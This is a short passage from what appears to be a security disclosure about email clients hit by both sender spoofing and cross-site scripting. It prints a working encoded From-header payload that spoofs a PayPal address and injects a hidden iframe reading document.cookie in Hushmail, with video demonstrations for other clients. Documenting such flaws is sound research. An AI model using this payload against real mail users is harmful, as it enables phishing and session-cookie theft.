## One more thing: Code injection

Some affected companies and vendors were affected by both email spoofing and code injection vulnerabilities (here, XSS).

- Example 1: [Hushmail](https://hushmail.com)

The code execution is triggered when clicking on “Create a rule”. Their team was extremely fast to fix the issue.

@[youtube](Upbamn3PZz8)

Here is the payload that was used for Hushmail:

`From: =?utf-8?b?c2VydmljZUBwYXlwYWwuY29tPGlmcmFtZSBvbmxvYWQ9YWxlcnQoZG9jdW1lbnQuY29va2llKSBzcmM9aHR0cHM6Ly93d3cuaHVzaG1haWwuY29tIHN0eWxlPSJkaXNwbGF5Om5vbmUi?==?utf-8?Q?=0A=00?=@mailsploit.com`

Which then becomes:

`From: service@paypal.com<iframe onload=alert(document.cookie) src=https://www.hushmail.com style="display:none"\n\0@mailsploit.com`

In this example, the HTML is inside the encoded part of the mail.

- Example 2: [Open Mailbox](https://openmailbox.org)

@[youtube](gfAGOMeiXNI)

- Example 3: [Spark](https://sparkmailapp.com/) and [Airmail](http://airmailapp.com/)

@[youtube](fyPhVIZQ44c)